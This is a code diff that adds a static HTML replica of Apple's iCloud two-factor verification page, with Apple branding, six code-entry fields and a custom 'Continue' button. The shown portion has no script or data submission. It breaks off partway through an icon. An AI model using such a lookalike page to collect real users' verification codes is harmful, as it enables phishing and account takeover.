@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>iCloud Verification — Static UI Preview</title>
+<style>
+:root {
+  --text: rgba(0, 0, 0, .88);
+  --secondary: rgba(0, 0, 0, .56);
+  --fill: rgba(120, 120, 128, .16);
+  --background: #fff;
+  --footer: #f2f2f7;
+  --icon: #000;
+  --shadow: rgba(120, 120, 128, .16);
+  --toolbar: rgba(251, 251, 253, .5);
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    --text: hsla(0, 0%, 100%, .98);
+    --secondary: hsla(0, 0%, 100%, .66);
+    --fill: rgba(120, 120, 128, .36);
+    --background: hsl(240, 3.4%, 11.4%);
+    --footer: #2c2c2e;
+    --icon: #fff;
+    --shadow: rgba(0, 0, 0, .65);
+    --toolbar: rgba(28, 28, 30, .5);
+  }
+}
+* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+html { display: flex; flex-direction: column; min-height: 100%; background: var(--background); }
+body {
+  display: flex; flex: 1; flex-direction: column;
+  color: var(--text); background: var(--background); color-scheme: light dark;
+  font: 400 17px/1.2 "SF Pro Text", "Helvetica Neue", sans-serif;
+  -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility;
+  -webkit-text-size-adjust: 100%; text-size-adjust: 100%; touch-action: pan-y;
+}
+.main-pane { position: absolute; width: 100%; height: 100%; }
+.root-viewport { position: absolute; inset: 0; display: flex; flex-direction: column; overflow: hidden; }
+.root-component { flex: 1; width: 100%; position: relative; z-index: 0; }
+.flex-page-viewport { position: absolute; inset: 0; overflow-y: auto; z-index: 2; will-change: opacity; }
+.flex-page-content { position: absolute; top: 0; left: 0; width: 100%; min-height: 100%; display: flex; flex-direction: column; align-items: stretch; }
+.cloudos-toolbar {
+  position: sticky; top: 0; z-index: 3; display: flex; align-items: center;
+  user-select: none; height: 44px; min-height: 44px; letter-spacing: 0;
+  padding: 0 6px 0 16px; background: var(--toolbar); border-bottom: 1px solid var(--toolbar);
+}
+.cloudos-toolbar::before { content: ""; position: absolute; inset: 0; z-index: -1; -webkit-backdrop-filter: blur(10px); backdrop-filter: blur(10px); }
+.icloud-logo { display: flex; flex: 0 0 auto; margin: 1px 0 0 -2px; }
+.icloud-logo a { display: flex; align-items: center; }
+.apple-icloud-logo { fill: var(--icon); width: auto; height: auto; }
+.action-buttons { display: flex; align-items: center; margin-left: auto; margin-right: 0; z-index: 1; }
+.ui-button {
+  user-select: none; white-space: nowrap; text-align: center; overflow: hidden;
+  text-overflow: ellipsis; display: inline-flex; position: relative; justify-content: center;
+  align-items: center; cursor: default; touch-action: manipulation; border-radius: 8px;
+  min-width: 30px; padding: 0 10px; font-size: 14px; font-weight: 600;
+}
+.ui-button svg { fill: currentColor; }
+.action-buttons .ui-button { border: 0; height: 36px; min-width: 36px; width: 36px; padding: 0; margin: 0 4px; }
+.home-login-component { flex: 1; display: flex; flex-direction: column; align-items: center; }
+.parent-container {
+  display: flex; flex-direction: column; position: relative; width: 640px;
+  height: auto; min-height: 650px; margin-top: 44px; border-radius: 34px;
+  box-shadow: 0 11px 34px 0 var(--shadow); background: var(--background);
+  -webkit-backdrop-filter: blur(10px); backdrop-filter: blur(10px);
+}
+.widget-icon-text { will-change: opacity; position: relative; left: 0; right: 0; margin: 40px 80px 25px; display: flex; flex-direction: column; align-items: center; }
+.widget-icon-text .icon { width: 160px; }
+.auth-widget { color-scheme: normal; }
+.verification-frame { will-change: opacity; display: inline-block; width: 100%; height: 271px; overflow: hidden; vertical-align: baseline; container: verification / inline-size; }
+.verification-body {
+  padding: 5px; min-width: 210px; min-height: 271px;
+  color: #1d1d1f; font: 400 17px/1.4705882353 "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
+  letter-spacing: -.022em; text-align: center; font-synthesis: none;
+  -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
+}
+.verification-body h1 {
+  margin-bottom: 20px; color: inherit;
+  font: 400 21px/1.381002381 "SF Pro Display", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
+  letter-spacing: .011em;
+}
+.verification-content { width: 100%; max-width: 460px; margin: auto; }
+.verification-info { margin: 0 auto 7px; padding: 0 5px; max-width: 440px; }
+.code-wrapper { display: grid; width: fit-content; margin: 14px auto; }
+.code-wrapper > div { grid-column: 1; }
+.code-inputs { display: flex; justify-content: center; gap: 20px; margin: 15px auto; }
+.code-inputs input {
+  appearance: none; width: 42px; height: 42px; border: 1px solid #86868b; border-radius: 8px;
+  color: #494949; background: hsla(0, 0%, 100%, .8); text-align: center;
+  font: 400 24px/1.3334133333 "SF Pro Display", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
+  letter-spacing: .009em; font-synthesis: none; -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale; cursor: default;
+}
+.code-inputs input:focus { outline: none; }
+.verification-links { min-width: 100%; width: 0; text-align: left; }
+.verification-links, .verification-links span { font: 400 14px/1.4285914286 "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif; letter-spacing: -.016em; }
+.verification-links > div + div { margin-top: 12px; }
+.verification-links button {
+  display: inline-block; box-sizing: content-box; overflow: visible; vertical-align: inherit;
+  background: none; border: none; border-radius: 0; color: #06c; text-align: center;
+  font: 400 17px/1.4705882353 "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
+  letter-spacing: -.022em; font-synthesis: none; -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale; cursor: default;
+}
+@media (min-device-width: 320px) and (max-device-width: 736px) {
+  .verification-body { width: 90%; margin: auto; }
+}
+@media (max-device-width: 736px) {
+  .verification-body h1 { font-size: 19px; line-height: 1.4211026316; letter-spacing: .012em; }
+}
+@container verification (max-width: 500px) { .code-inputs { gap: 10px; } }
+@container verification (max-width: 374px) {
+  .code-inputs input { width: 38px; height: 38px; font-size: 21px; line-height: 1.381002381; letter-spacing: .011em; }
+}
+.quick-access-container { max-width: 570px; border-top: 1px solid hsla(0, 0%, 84.7%, .7); margin: 30px 100px 40px; position: relative; }
+.quick-access { margin: 0 15px; padding-top: 30px; }
+.quick-access-label { text-align: center; font-size: 14px; font-weight: 400; line-height: 20px; color: var(--text); }
+.quick-access-buttons { display: grid; grid-auto-flow: column; grid-auto-columns: 1fr; column-gap: 40px; padding-top: 6px; margin-top: 20px; }
+.quick-access-button, .quick-access-button .ui-button { display: flex; flex-direction: column; align-items: center; }
+.quick-access-button .ui-button { font: 400 14px/20px "SF Pro Text", "Helvetica Neue", sans-serif; text-align: center; white-space: nowrap; color: var(--secondary); height: auto; padding: 10px; }
+.quick-access-button .ui-button svg { opacity: .5; }
+.quick-access-button .title { margin-top: 10px; }
+.quick-access-button .title svg { opacity: 1; }
+.cloudos-menu-item-opens-in-new-tab { margin: -5px -7px; }
+footer { margin-top: 160px; }
+.legal-footer { display: flex; justify-content: center; align-items: center; flex-direction: column; overflow: hidden; padding: 30px 0; width: 100%; background: var(--footer); }
+.application-content { margin: 0 auto; width: 345px; max-width: 345px; }
+.legal-footer-content { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; column-gap: 12px; font: 400 11px/1.2 "SF Pro Text", "Helvetica Neue", sans-serif; }
+.inner-row { line-height: 2; display: flex; flex-wrap: wrap; column-gap: 10px; }
+.inner-row a { text-decoration: none; color: var(--secondary); }
+.with-separator { display: flex; flex-wrap: nowrap; column-gap: 10px; }
+.separator { height: 15px; width: 1px; align-self: center; background: var(--fill); }
+.copyright { color: var(--secondary); text-align: center; margin-left: auto; }
+@media (min-width: 760px) and (max-width: 1164px) {
+  footer { margin-top: 140px; }
+  .application-content { width: 690px; max-width: 690px; }
+}
+@media (min-width: 1165px) { .application-content { width: 1035px; max-width: 1035px; } }
+@media (max-width: 759px) {
+  footer { margin-top: 0; }
+  .home-login-component { width: 100%; }
+  .parent-container { flex-grow: 1; width: 100%; min-height: auto; margin-top: 0; border-radius: 0; -webkit-backdrop-filter: none; backdrop-filter: none; }
+  .widget-icon-text { margin-left: 40px; margin-right: 40px; }
+  .body-view { padding-left: 40px; padding-right: 40px; }
+  .quick-access-container { margin-left: auto; margin-right: auto; }
+}
+@media (max-width: 400px) { .body-view { padding-left: 20px; padding-right: 20px; } }
+@media (max-width: 759px) and (max-height: 610px) { .parent-container { overflow-y: auto; } }
+@media (max-height: 675px) {
+  .home-login-component { min-height: 490px; height: 100%; margin-bottom: 80px; }
+  .quick-access { padding-top: 0; padding-bottom: 0; margin-top: 20px; margin-bottom: 20px; }
+  .quick-access-buttons { margin-top: 20px; margin-bottom: 20px; }
+}
+</style>
+</head>
+<body>
+<div class="main-pane">
+<div class="root-viewport">
+<div class="root-component">
+<div class="flex-page-viewport">
+<div class="flex-page-content">
+<header class="cloudos-toolbar login overlay">
+<div class="icloud-logo">
+<a aria-disabled="true" aria-label="iCloud">
+<svg aria-hidden="true" class="apple-icloud-logo dark" height="31" viewBox="0 0 82 31" xmlns="http://www.w3.org/2000/svg">
+<g fill-rule="nonzero">
+<path d="M16.907 16.5h2.55V5.423h-2.55V16.5Zm1.28-12.832c.412 0 .763-.144 1.05-.43a1.41 1.41 0 0 0 .432-1.033c0-.407-.144-.753-.432-1.038a1.445 1.445 0 0 0-1.05-.426c-.407 0-.756.142-1.046.426-.291.285-.437.63-.437 1.038 0 .401.146.745.437 1.032.29.287.64.43 1.046.43v.001Zm9.915 13.156c1.14 0 2.157-.21 3.052-.631.864-.395 1.616-1 2.188-1.758.563-.752.908-1.624 1.037-2.619l.007-.091h-2.594l-.021.076a3.58 3.58 0 0 1-.713 1.465 3.35 3.35 0 0 1-1.258.943c-.5.219-1.065.328-1.695.328-.847 0-1.582-.22-2.204-.663-.623-.442-1.103-1.07-1.441-1.884-.338-.813-.507-1.776-.507-2.886v-.016c0-1.115.17-2.076.507-2.886.338-.81.817-1.434 1.439-1.875.62-.44 1.354-.66 2.199-.66.634 0 1.201.117 1.702.351.501.235.92.565 1.257.99.338.425.572.926.705 1.505l.026.105h2.59l-.004-.093c-.118-1.006-.46-1.895-1.028-2.668a5.886 5.886 0 0 0-2.204-1.819c-.901-.439-1.916-.658-3.044-.658-1.405 0-2.619.311-3.642.935-1.022.624-1.812 1.511-2.368 2.663-.556 1.152-.834 2.523-.834 4.113v.016c0 1.588.278 2.958.834 4.11.555 1.154 1.346 2.043 2.372 2.669 1.026.625 2.24.938 3.642.938Zm8.034-.324h2.55V1.24h-2.55V16.5Zm9.534.222c1.1 0 2.049-.231 2.846-.693.797-.461 1.413-1.122 1.846-1.982.434-.86.65-1.886.65-3.08v-.02c0-1.191-.218-2.216-.655-3.074a4.68 4.68 0 0 0-1.852-1.98c-.798-.46-1.744-.691-2.838-.691-1.086 0-2.03.23-2.829.694a4.69 4.69 0 0 0-1.855 1.981c-.438.859-.656 1.882-.656 3.07v.02c0 1.191.216 2.217.65 3.078.434.86 1.05 1.522 1.85 1.984.8.462 1.747.693 2.843.693Zm.004-2.066c-.572 0-1.063-.146-1.472-.436-.408-.291-.722-.711-.941-1.261-.219-.55-.329-1.213-.329-1.99v-.02c0-.776.11-1.438.33-1.985.22-.548.535-.967.944-1.259.408-.291.896-.437 1.461-.437.571 0 1.06.145 1.469.436.408.29.721.71.941 1.258.22.549.33 1.21.33 1.987v.02c0 .776-.11 1.438-.328 1.988-.218.55-.53.97-.936 1.262-.406.29-.896.437-1.469.437Zm10.596 2.066c.497.008.991-.071 1.46-.233.43-.156.798-.378 1.106-.668.309-.29.557-.639.73-1.026h.13V16.5h2.55V5.423h-2.55v6.444c0 .41-.055.782-.165 1.114a2.33 2.33 0 0 1-.485.853 2.153 2.153 0 0 1-.783.546 2.744 2.744 0 0 1-1.054.191c-.754 0-1.307-.216-1.657-.647-.35-.431-.526-1.063-.526-1.894V5.423h-2.55v7.166c0 .867.144 1.61.433 2.228.289.618.716 1.09 1.281 1.416.566.326 1.259.489 2.08.489Zm12.084-.024c.525 0 1.005-.08 1.441-.24a3.453 3.453 0 0 0 1.955-1.747h.13V16.5h2.55V1.24h-2.55v5.997h-.13a3.292 3.292 0 0 0-.802-1.073c-.338-.3-.727-.53-1.167-.694a4.093 4.093 0 0 0-1.433-.244c-.932 0-1.739.23-2.42.693-.681.463-1.207 1.122-1.579 1.978-.371.855-.557 1.873-.557 3.055v.016c0 1.175.186 2.19.559 3.049.372.858.9 1.52 1.585 1.984.684.464 1.49.697 2.418.697Zm.783-2.15c-.566 0-1.054-.145-1.466-.432-.412-.287-.728-.699-.95-1.235-.22-.536-.33-1.174-.33-1.913v-.016c0-.742.11-1.38.331-1.912.222-.533.539-.944.95-1.232.412-.288.9-.432 1.465-.432.56 0 1.046.146 1.46.436.413.29.735.703.964 1.237.228.534.343 1.169.343 1.906v.016c0 .732-.114 1.366-.34 1.902-.227.536-.548.95-.963 1.24-.415.29-.903.434-1.464.434v.001ZM8.856 3.158C9.35 2.56 9.7 1.745 9.7.92c0-.114-.01-.227-.03-.32-.805.03-1.774.536-2.351 1.217-.454.516-.877 1.341-.877 2.167 0 .123.02.247.031.288.052.01.134.021.217.021.721 0 1.629-.485 2.165-1.135h.001Zm.567 1.31c-1.207 0-2.186.733-2.815.733-.67 0-1.546-.691-2.598-.691C2.02 4.51 0 6.16 0 9.265c0 1.94.742 3.982 1.67 5.303.794 1.114 1.485 2.032 2.485 2.032.99 0 1.422-.66 2.65-.66 1.247 0 1.525.64 2.618.64 1.082 0 1.804-.991 2.484-1.971.763-1.124 1.083-2.218 1.093-2.27-.062-.02-2.134-.866-2.134-3.239 0-2.053 1.629-2.97 1.722-3.043-1.073-1.547-2.712-1.589-3.165-1.589Z" transform="translate(2.5 6.5)">
+</path>
+</g>
+</svg>
+</a>
+</div>
+<div class="action-buttons">
+<div aria-disabled="true" aria-label="Help" class="ui-button" role="button" tabindex="-1" title="Help">
+<svg aria-hidden="true" class="ellipsis" height="22" viewBox="0 0 64 64" width="22" xmlns="http://www.w3.org/2000/svg">
+<path d="M12.9321097,6.8055484 C12.9321097,3.30883872 10.0968839,0.505161291 6.53720646,0.505161291 C3.07198065,0.505161291 0.236774194,3.30883872 0.236774194,6.8055484 C0.236774194,10.3022581 3.07198065,13.1059355 6.53720646,13.1059355 C10.0968839,13.1059355 12.9321097,10.3022581 12.9321097,6.8055484 Z M36.2435936,6.8055484 C36.2435936,3.30883872 33.4399162,0.505161291 29.9432065,0.505161291 C26.4779807,0.505161291 23.6743033,3.30883872 23.6743033,6.8055484 C23.6743033,10.3022581 26.4779807,13.1059355 29.9432065,13.1059355 C33.4399162,13.1059355 36.2435936,10.3022581 36.2435936,6.8055484 Z M59.6495291,6.8055484 C59.6495291,3.30883872 56.8459162,0.505161291 53.3492065,0.505161291 C49.7894646,0.505161291 46.9857872,3.30883872 46.9857872,6.8055484 C46.9857872,10.3022581 49.7894646,13.1059355 53.3492065,13.1059355 C56.8459162,13.1059355 59.6495291,10.3022581 59.6495291,6.8055484 Z" transform="translate(2 25.226)">
+</path>
+</svg>
+</div>
+</div>
+</header>
+<main class="home-login-component">
+<div class="parent-container">
+<div class="body-view">
+<div class="widget-icon-text">
+<svg aria-hidden="true" class="icon" draggable="false" viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg">
+<defs>
+<linearGradient id="ring1" x1="100%" x2="50%" y1="100%" y2="50%">
+<stop offset="0%" stop-color="#8700FF">
+</stop>
+<stop offset="100%" stop-color="#EE00E1" stop-opacity="0">
+</stop>
+</linearGradient>
+<linearGradient id="ring2" x1="0%" x2="50%" y1="100%" y2="50%">
+<stop offset="0%" stop-color="#E00">
+</stop>
+<stop offset="100%" stop-color="#EE00E1" stop-opacity="0">
+</stop>
+</linearGradient>
+<linearGradient id="ring3" x1="100%" x2="50%" y1="0%" y2="50%">
+<stop offset="0%" stop-color="#00B1EE">
+</stop>
+<stop offset="100%" stop-color="#00B1EE" stop-opacity="0">
+</stop>
+</linearGradient>
+<linearGradient id="ring4" x1="-17.876%" x2="48.935%" y1="21.021%" y2="50%">
+<stop offset="0%" stop-color="#FFA456">
+</stop>
+<stop offset="100%" stop-color="#FFA456" stop-opacity="0">
+</stop>
+</linearGradient>
+<path d="M89.905 152.381a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619zm-23.737 2.79a3.81 3.81 0 117.36 1.973 3.81 3.81 0 01-7.36-1.972zm46.799-5.126a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm-60.58-2.409a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm28.777-4.373a3.302 3.302 0 11-.804 6.554 3.302 3.302 0 01.804-6.554zm-16.684-1.899a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm36.901 2.383a3.338 3.338 0 11-6.61.93 3.338 3.338 0 016.61-.93zm28.591-4.621a3.81 3.81 0 11-6.598 3.81 3.81 3.81 0 016.598-3.81zm-94.15-.941a3.81 3.81 0 11-5.387 5.387 3.81 3.81 0 015.388-5.387zm52.547-.486a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-15.136.077a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm-24.278-2.592a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm68.381.883a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm-10.664-.222a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-48.079-1.912a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm22.334-3.47a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.202zm-13.241-1.507a2.65 2.65 0 11-1.985 4.912 2.65 2.65 0 011.985-4.912zm29.286 1.891a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm23.196-3.668a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm-74.721-.747a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm98.125-2.255a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zM35.56 125.196a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-13.29-.428a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm108.491-.249a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-75.396-.468a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm54.271.7a2.65 2.65 0 11-4.877 2.071 2.65 2.65 0 014.877-2.07zm21.327-9.436a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-86.23.808a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-10.043-.339a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm85.6-.197a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-95.085-3.507a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm115.534-2.19a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm12.102-3.672a3.81 3.81 0 11-3.81 6.599 3.81 3.81 0 013.81-6.599zM12.65 108.301a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm23.865-2.586a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm91.693-1.738a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm10.11-2.915a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-111.262 1.653a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-8.458-5.983a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm127.992-3.554a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm-115.319.356a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm101.581-2.821a2.65 2.65 0 11-1.984 4.912 2.65 2.65 0 011.984-4.912zm19.627-1.547a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zM3.81 86.096a3.81 3.81 0 110 7.618 3.81 3.81 0 010-7.619zm137.923-.705a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-121.694-.3a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-6.938-8.368a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm13.807.93a2.62 2.62 0 11-.638 5.202 2.62 2.62 0 01.638-5.202zm120.796-1.946a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm-13.968 1.14a2.62 2.62 0 11-.638 5.201 2.62 2.62 0 01.638-5.201zm7.24-7.477a3.023 3.023 0 110 6.046 3.023 3.023 0 010-6.046zm-120.128-.094a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm135.342-2.99a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.62zM.162 68.862a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zm29.28-5.072a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.985-4.913zm104.844 1.355a2.65 2.65 0 11-5.247.737 2.65 2.65 0 015.247-.737zm-117.992-5.89a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm132.102 1.708a3.338 3.338 0 11-6.61.929 3.338 3.338 0 016.61-.93zm-8.594-4.735a3.023 3.023 0 11-5.84 1.565 3.023 3.023 0 015.84-1.565zm-114.08-2.019a3.023 3.023 0 11-3.024 5.237 3.023 3.023 0 013.024-5.237zm9.569-3.001a2.65 2.65 0 11-3.189 4.23 2.65 2.65 0 013.189-4.23zm93.381.423a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm26.039-1.904a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zM10.969 47.183a3.81 3.81 0 11-3.809 6.599 3.81 3.81 0 013.81-6.599zm12.693-3.781a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm117.661.533a3.338 3.338 0 11-6.145 2.608 3.338 3.338 0 016.145-2.608zm-9.76-2.235a3.023 3.023 0 11-5.237 3.024 3.023 3.023 0 015.237-3.024zm-97.233-.783a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm9.866-.35a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm75.556-.537a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm24.578-8.608a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm-122.515-.987a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zm33.736 2.159a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm52.583-1.46a2.65 2.65 0 11-3.189 4.231 2.65 2.65 0 013.189-4.231zm-73.251-1.14a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm84.962-.194a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-73.76.505a3.023 3.023 0 11-5.238 3.024 3.023 3.023 0 015.237-3.024zm83.999-.987a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-61.5-1.487a2.65 2.65 0 11-5.247.738 2.65 2.65 0 015.247-.738zm26.024-2.284a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.984-4.913zm-14.487-1.912a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.201zm25.325-2.297a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-45.261 1.76a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-10.994-3.15a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm66.254-1.84a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm14.12-1.68a3.81 3.81 0 11-5.388 5.387 3.81 3.81 0 015.388-5.387zm-40.217.463a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-16.701-.13a3.023 3.023 0 110 6.048 3.023 3.023 0 010-6.047zm-36.02.304a3.81 3.81 0 11-6.6 3.81 3.81 3.81 0 016.6-3.81zm28.985-3.118a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm32.79-2.877a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zM80.149 8.66a3.302 3.302 0 11-.804 6.553 3.302 3.302 0 01.804-6.553zm31.274-2.894a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm-57.03 2.217a3.81 3.81 0 11-7.359 1.972 3.81 3.81 0 017.36-1.972zM91.139.163a3.81 3.81 0 11-1.972 7.359 3.81 3.81 0 011.972-7.36zM70.095 0a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619z" id="ring0">
+</path>
+</defs>
+<use fill="#FFF" href="#ring0">
+</use>
+<use fill="url(#ring1)" href="#ring0">
+</use>
+<use fill="url(#ring2)" href="#ring0">
+</use>
+<use fill="url(#ring3)" href="#ring0">
+</use>
+<use fill="url(#ring4)" href="#ring0">
+</use>
+<path d="M80.38 68.181c1.66 0 3.75-1.091 4.999-2.565 1.137-1.346 1.94-3.183 1.94-5.039 0-.255-.02-.51-.057-.71-1.865.073-4.103 1.201-5.427 2.73-1.063 1.164-2.033 3.02-2.033 4.875 0 .29.056.564.075.655.112.018.298.054.503.054zm-5.724 27.713c2.248 0 3.243-1.474 6.044-1.474 2.838 0 3.483 1.438 5.97 1.438 2.47 0 4.11-2.239 5.677-4.44 1.732-2.53 2.469-4.987 2.487-5.115-.147-.036-4.865-1.947-4.865-7.28 0-4.622 3.704-6.697 3.926-6.86-2.451-3.477-6.192-3.586-7.224-3.586-2.746 0-4.994 1.656-6.431 1.656-1.53 0-3.52-1.547-5.916-1.547-4.551 0-9.158 3.713-9.158 10.701 0 4.368 1.695 8.973 3.814 11.94 1.806 2.51 3.39 4.567 5.676 4.567z" fill="var(--icon)">
+</path>
+</svg>
+</div>
+<div class="auth-widget">
+<div class="verification-frame">
+<section aria-labelledby="verification-title" class="verification-body">
+<h1 id="verification-title">Two-Factor Authentication</h1>
+<div class="verification-content">
+<div class="verification-info">A message with a verification code has been sent to your devices. Enter the code to continue.</div>
+<div class="code-wrapper">
+<div aria-label="Verification code preview" class="code-inputs" role="group">
+<input aria-label="Verification code digit 1" autocomplete="off" tabindex="0" maxlength="1" type="text"/>
+<input aria-label="Verification code digit 2" autocomplete="off" tabindex="0" maxlength="1" type="text"/>
+<input aria-label="Verification code digit 3" autocomplete="off" tabindex="0" maxlength="1" type="text"/>
+<input aria-label="Verification code digit 4" autocomplete="off" tabindex="0" maxlength="1" type="text"/>
+<input aria-label="Verification code digit 5" autocomplete="off" tabindex="0" maxlength="1" type="text"/>
+<input aria-label="Verification code digit 6" autocomplete="off" tabindex="0" maxlength="1" type="text"/>
+</div>
+
+<!-- Submit Button -->
+<div style="text-align: center; margin-top: 20px;">
+  <button id="submit-code" type="button" style="background: #0071e3; color: white; border: none; border-radius: 8px; padding: 12px 40px; font-size: 14px; font-weight: 600; cursor: pointer; opacity: 0.42; pointer-events: auto;">
+    Continue
+  </button>
+</div>
+
+<div class="verification-links">
+<div>
+<button disabled="" tabindex="-1" type="button">
+<span>Resend code</span>
+</button>
+</div>
+<div>
+<button disabled="" tabindex="-1" type="button">
+<span>Can’t get to your devices?</span>
+</button>
+</div>
+</div>
+</div>
+</div>
+</section>
+</div>
+</div>
+<div class="quick-access-container">
+<div class="quick-access">
+<div class="quick-access-label">If you can’t enter a code because you’ve lost your device, you can use Find Devices to locate it or Manage Devices to remove your Apple Pay cards from it.</div>
+<div class="quick-access-buttons">
+<div class="quick-access-button">
+<div aria-disabled="true" class="ui-button" role="button" tabindex="-1">
+<svg class="layout-box" version="1.1" viewBox="0 0 113.683837890625 111.1806640625" width="37" xmlns="http://www.w3.org/2000/svg">
+<g transform="matrix(1 0 0 1 -1.683129882812409 90.8203125)">
+<path d="M8.72266-35.2606C8.72266-7.47784 31.3516 15.1511 59.1344 15.1511C86.9606 15.1511 109.59-7.47784 109.59-35.2606C109.59-50.7642 102.467-64.6827 91.3977-73.9726L87.465-67.3934C96.3507-59.5491 102.026-48.0686 102.026-35.2606C102.026-11.5985 82.7966 7.63087 59.1344 7.63087C35.5156 7.63087 16.2863-11.5985 16.2863-35.2606C16.2863-48.0686 21.9181-59.5491 30.8038-67.3934L26.9146-73.9726C15.8451-64.6827 8.72266-50.7642 8.72266-35.2606ZM25.0223-35.2606C25.0223-16.4104 40.3276-1.10512 59.1344-1.10512C77.9846-1.10512 93.2899-16.4104 93.2899-35.2606C93.2899-44.9063 89.2816-53.5323 82.864-59.7789L78.7988-52.9359C83.0601-48.2867 85.6766-42.0758 85.6766-35.2606C85.6766-20.6122 73.7828-8.71848 59.1344-8.71848C44.486-8.71848 32.5922-20.6122 32.5922-35.2606C32.5922-42.0758 35.2086-48.2867 39.5134-52.9359L35.4047-59.7789C29.0306-53.5323 25.0223-44.9063 25.0223-35.2606ZM41.1755-35.2709C41.1755-25.3573 49.2208-17.312 59.1344-17.312C69.048-17.312 77.1367-25.3573 77.1367-35.2709C77.1367-40.3835 74.9749-44.9589 71.5659-48.2212L88.1519-75.7173C88.3491-76.0494 88.2885-76.3695 87.9564-76.6204C79.8818-82.4204 69.3532-85.6724 